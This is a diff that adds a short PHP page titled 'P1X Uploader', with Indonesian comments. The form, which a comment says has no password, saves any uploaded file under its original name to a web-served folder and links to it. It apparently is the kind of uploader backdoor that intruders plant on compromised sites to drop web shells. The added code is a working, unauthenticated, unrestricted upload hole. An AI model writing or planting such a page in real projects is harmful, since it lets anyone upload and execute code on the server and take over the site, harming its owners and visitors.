@@ -1,0 +1,27 @@
+<?php
+if(isset($_POST['uploaded'])) {
+    $file = $_FILES['files']['name'];
+    $files = $_FILES['files']['tmp_name'];
+    $folder = ""; // Isi dengan folder tujuan untuk menyimpan file
+    
+    if(move_uploaded_file($files, $folder.$file)) {
+        $result = "Uploaded: <a href='$file' target='_blank'>Your file here</a>";
+    } else {
+        $result = "Failed to upload!";
+    }
+}
+
+// Bagian upload form tanpa password
+echo '<html><head><title>P1X Uploader</title></head><body><center>
+<form action="" method="post" enctype="multipart/form-data">
+<input type="file" name="files" />
+<input type="submit" name="uploaded" value="Upload">
+</form>';
+
+// Menampilkan hasil upload
+if(isset($result)) {
+    echo $result;
+}
+
+echo '</center></body></html>';
+?>
